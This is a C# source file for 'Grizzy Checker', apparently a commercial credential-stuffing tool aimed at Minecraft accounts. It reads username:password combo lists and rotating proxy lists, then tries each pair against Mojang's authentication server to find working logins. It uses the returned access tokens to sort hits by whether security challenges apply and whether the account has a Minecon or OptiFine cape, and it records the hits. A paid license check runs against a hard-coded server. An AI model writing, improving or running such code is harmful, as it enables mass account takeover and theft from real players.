using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using xNet;
using HttpRequest = xNet.HttpRequest;
using HttpResponse = xNet.HttpResponse;
using HttpStatusCode = xNet.HttpStatusCode;

namespace MinecraftSharp
{
    internal class Program
    {
        private static UVThreadPoll _threadPoll;
        private static bool IsStopping = false;
        public static Configuration configuration { get; set; }

        static Stopwatch mywatch = new Stopwatch();

        public static void Main(string[] args)
        {
            Console.Title = "Grizzy Checker | Hits: 0 | Failed: 0";

            Console.WriteLine(@"
             _____        _                             
            |  __ \      (_)                            
            | |  \/ _ __  _  ____ ____ _   _            
            | | __ | '__|| ||_  /|_  /| | | |           
            | |_\ \| |   | | / /  / / | |_| |           
             \____/|_|   |_|/___|/___| \__, |           
                                        __/ |           
                                       |___/            
             _____  _                  _                
            /  __ \| |                | |               
            | /  \/| |__    ___   ___ | | __  ___  _ __ 
            | |    | '_ \  / _ \ / __|| |/ / / _ \| '__|
            | \__/\| | | ||  __/| (__ |   < |  __/| |   
             \____/|_| |_| \___| \___||_|\_\ \___||_|   
            ");
            if (!File.Exists(@"configuration.json"))
            {
                configuration = Configuration.FromJson(
                    "{\"license\":\"\",\"proxy-type\":\"SOCKS4\", \"background-process\":false,\"auto-update\":true,\"update-server\":\"a\",\"fail-print\":false,\"hits-print\":true,\"save-hits\":true,\"save-fails\":false,\"formats\":{\"file-format\":\"mm/dd/yy-hh:mm:ss\",\"nfa-format\":\"[NFA]\",\"sfa-format\":\"[SFA]\",\"fa-format\":\"[FA]\",\"migrate-format\":\"[MGT]\"}}");
                System.IO.File.WriteAllText(@"configuration.json", configuration.ToJson());
                Console.WriteLine("\nPlease type your license");
                Console.Write("> ");
                configuration.License = Console.ReadLine();
            }
            else
            {
                configuration = Configuration.FromJson(readFile(@"configuration.json"));
                if (configuration.License == string.Empty)
                {
                    Console.WriteLine("\nPlease type your license");
                    Console.Write("> ");
                    configuration.License = Console.ReadLine();
                }
            }

            var licenseFetch = checkLicense(configuration.License);

            if (licenseFetch)
            {
                _threadPoll = new UVThreadPoll(configuration.Background);
                System.IO.File.WriteAllText(@"configuration.json", configuration.ToJson());
                checkFiles();

                Console.ForegroundColor = ConsoleColor.White;
                Data.CurrentAccount = 0;
                if (Data.AccountsList.Count > 0 && Data.ProxyList.Count > 0)
                {
                    mywatch.Start();
                    _threadPoll.addToQueue(Checker);
                }
                else
                {
                    Console.WriteLine("Press R to reload combos and proxys");
                    if (Console.ReadKey().Key == ConsoleKey.R)
                    {
                        checkFiles();
                    }
                }
            }
            else
            {
                Console.WriteLine("The license is invalid, please buy one at {0}", "http://shop.grizzy.us");
            }

            Console.ReadKey(true);
        }

        private static void checkFiles()
        {
            checkFolder("accounts");
            checkFolder("proxy");
            string[] accounts = Directory.GetFiles(@"accounts", "*.txt", SearchOption.AllDirectories);
            foreach (var file in accounts)
            {
                readFile(file, Data.AccountsList);
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[♥] Upload {0} {1} ", Data.AccountsList.Count,
                Data.AccountsList.Count > 1 ? "accounts" : "account");
            string[] proxys = Directory.GetFiles(@"proxy", "*.txt", SearchOption.AllDirectories);
            foreach (var file in proxys)
            {
                readFile(file, Data.ProxyList);
            }

            Console.WriteLine("[♥] Upload {0} {1} ", Data.ProxyList.Count,
                Data.ProxyList.Count > 1 ? "proxys" : "proxy");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(
                "We do not recommend the use of HTTP proxy, use SOCKS4 or SOCKS5 for best performance");
        }

        private static void Checker()
        {
            List<MinecraftAccount> success_accounts = new List<MinecraftAccount>();
            List<MinecraftAccount> failed_accounts = new List<MinecraftAccount>();
            List<MinecraftAccount> forbidden_accounts = new List<MinecraftAccount>();
            List<MinecraftAccount> nulled_accounts = new List<MinecraftAccount>();

            Data.AccountsList.ForEach(s =>
            {
                var acc = s.Split(':');

                var username = acc[0];
                var password = acc[1];

                var account = MojangApi(username, password);
                switch (account.minecraft_state)
                {
                    case State.failed:
                        if (configuration.FailPrint)
                        {
                            Console.WriteLine("{0} Failed", account.account);
                        }

                        failed_accounts.Add(account);
                        break;
                    case State.forbidden:
                        if (configuration.FailPrint)
                        {
                            Console.WriteLine("{0} Forbidden", account.account);
                        }

                        forbidden_accounts.Add(account);
                        break;
                    case State.nfa:
                        if (configuration.HitsPrint)
                        {
                            Console.WriteLine("{0} • Minecon {1} • Optifine {2} • {3} ", account.hasMinecon,
                                account.hasOptifine, configuration.Formats.NfaFormat, account.account);
                        }

                        success_accounts.Add(account);
                        break;
                    case State.sfa:
                        if (configuration.HitsPrint)
                        {
                            Console.WriteLine("{0} • Minecon {1} • Optifine {2}  • {3} ", account.hasMinecon,
                                account.hasOptifine, configuration.Formats.NfaFormat, account.account);
                        }

                        success_accounts.Add(account);
                        break;
                    case State.NULL:
                        if (configuration.FailPrint)
                        {
                            Console.WriteLine("{0} Nulled", account.account);
                        }

                        nulled_accounts.Add(account);
                        break;
                }

                Thread.CurrentThread.Interrupt();
                Console.Title = "Grizzy Checker | Hits: " + success_accounts.Count + " | Failed: " +
                                failed_accounts.Count;
            });
            mywatch.Stop();
            Console.WriteLine("• {0} success accounts • {1} failed accounts in {2}ms", success_accounts.Count,
                failed_accounts.Count + forbidden_accounts.Count + nulled_accounts.Count, mywatch.ElapsedTicks);
            _threadPoll.collectGarbage();
        }

        private static MinecraftAccount MojangApi(string username, string password)
        {
            var request = new HttpRequest
            {
                UserAgent = Http.ChromeUserAgent(),
                Cookies = new CookieDictionary(false),
                IgnoreProtocolErrors = true,
                AllowAutoRedirect = false
            };
            request.IgnoreProtocolErrors = true;
            var proxy = Data.GetRandomProxy();
            switch (configuration.ProxyType)
            {
                case "HTTP":
                    request.Proxy = HttpProxyClient.Parse(proxy);
                    break;
                case "SOCKS4":
                    request.Proxy = Socks4ProxyClient.Parse(proxy);
                    break;
                case "SOCKS5":
                    request.Proxy = Socks5ProxyClient.Parse(proxy);
                    break;
            }

            HttpResponse response = null;
            try
            {
                response = request.Post("https://authserver.mojang.com/authenticate",
                    "{\"agent\": {\"name\":\"Minecraft\",\"version\":\"1\"},\"username\":\"" + username +
                    "\",\"password\":\"" + password + "\",\"requestUser\":\"true\"}", "application/json");
            }
            catch (NetException e)
            {
                if (e.Message.Contains("Получен пустой ответ от HTTP-сервера "))
                    Console.WriteLine("Received an empty response from the HTTP server from account {0}",
                        username + ":" + password);
                if (e.Message.Contains("Не удалось соединиться с HTTP-сервером "))
                    Console.WriteLine("Failed to connect to the HTTP server from account {0}",
                        username + ":" + password);
                else
                {
                    Console.WriteLine(e.StackTrace);
                }

                // throw;
            }

            MinecraftAccount accountRest = new MinecraftAccount(State.waiting, username + ":" + password);
            if (response != null)
            {
                if (response.StatusCode != HttpStatusCode.Forbidden)
                {
                    Console.WriteLine(response.ToString());
                    RestMinecraft minecraftResponse = RestMinecraft.FromJson(response.ToString());
                    accountRest.minecraft_state = !RestAPI.checkChallenges(minecraftResponse.AccessToken, proxy)
                        ? State.nfa
                        : State.sfa;
                    accountRest.hasMinecon =
                        RestAPI.hasMineconCape(minecraftResponse.SelectedProfile.Id, minecraftResponse.AccessToken,
                            proxy);
                    accountRest.hasOptifine = RestAPI.checkCapes(minecraftResponse.SelectedProfile.Name, proxy);

                    return accountRest;
                }
                else
                {
                    if (response.ToString().Contains("errorMessage"))
                    {
                        if (response.ToString().Contains("Invalid credentials. Invalid username or password."))
                        {
                            accountRest.minecraft_state = State.failed;
                            return accountRest;
                        }
                        else
                        {
                            accountRest.minecraft_state = State.forbidden;
                            return accountRest;
                        }
                    }
                    else
                    {
                        accountRest.minecraft_state = State.failed;
                        return accountRest;
                    }
                }
            }
            else
            {
                accountRest.minecraft_state = State.NULL;
                return accountRest;
            }

            return accountRest;
        }

        static void checkFolder(string path)
        {
            try
            {
                if (!Directory.Exists(path))
                {
                    DirectoryInfo di = Directory.CreateDirectory(path);
                }
            }
            catch (IOException ioex)
            {
                Console.WriteLine(ioex.Message);
            }
        }


        static void readFile(string path, List<string> array)
        {
            var fileStream = new FileStream(@path, FileMode.Open, FileAccess.Read);
            using (var streamReader = new StreamReader(fileStream, Encoding.UTF8))
            {
                string line;
                Int32 count = 0;
                while ((line = streamReader.ReadLine()) != null)
                {
                    array.Add(line);
                    count++;
                }
            }
        }

        static void saveAccount(List<MinecraftAccount> success, List<MinecraftAccount> failed)
        {
            Directory.CreateDirectory("accounts");
            List<string> total = new List<string>();
            if (configuration.SaveHits)
            {
                foreach (var acc in success)
                {
                    string template =
                        $" {acc.minecraft_state.ToString()}  • Minecon {acc.hasMinecon} • Optifine {acc.hasOptifine} • {acc.account} ";
                    total.Add(template);
                }
            }

            if (configuration.SaveFails)
            {
                foreach (var acc in failed)
                {
                    string template =
                        $"[{acc.minecraft_state.ToString()}] • {acc.account} ";
                    total.Add(template);
                }
            }

            var dir_name = "hits\\" + DateTime.Now.ToString("MM_dd_yyyy h_mm_SS");
            Directory.CreateDirectory(dir_name);
            File.WriteAllLines(dir_name + "\\" + DateTime.Now.ToString("MM_dd_yyyy h_mm_SS") + ".txt", total);
        }

        static string readFile(string path)
        {
            var fileStream = new FileStream(@path, FileMode.Open, FileAccess.Read);
            using (var streamReader = new StreamReader(fileStream, Encoding.UTF8))
            {
                string line = streamReader.ReadLine();
                return line;
            }
        }

        static bool checkLicense(string license)
        {
            using (var request = new HttpRequest())
            {
                request.UserAgent = Http.ChromeUserAgent();
                request.AllowAutoRedirect = false;
                request.IgnoreProtocolErrors = true;
                // request.Proxy = HttpProxyClient.Parse("137.116.164.134:8080");

                try
                {
                    HttpResponse response = request.Post("http://51.79.30.144:5555/license",
                        "{\n\t\"license\": \"" + license + "\"\n}", "application/json");

                    return response.StatusCode == HttpStatusCode.Accepted;
                }
                catch (Exception e)
                {
                    Console.WriteLine("The servers are in maintenance");
                    return false;
                }
            }
        }
    }
}